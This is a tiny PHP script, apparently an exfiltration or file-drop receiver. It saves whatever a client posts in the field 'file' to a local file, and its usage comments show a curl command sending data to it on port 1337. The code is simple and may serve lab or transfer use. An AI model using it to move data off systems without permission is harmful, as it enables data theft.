// Usage:
// (Server) php -S 0.0.0.0:1337
// (Client) curl --data file=$(data to send) http://phpWeb.server:1337/post.php

<?php 
if (isset($_POST['file'])) {
        $file = fopen("/home/user/reveived_data","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
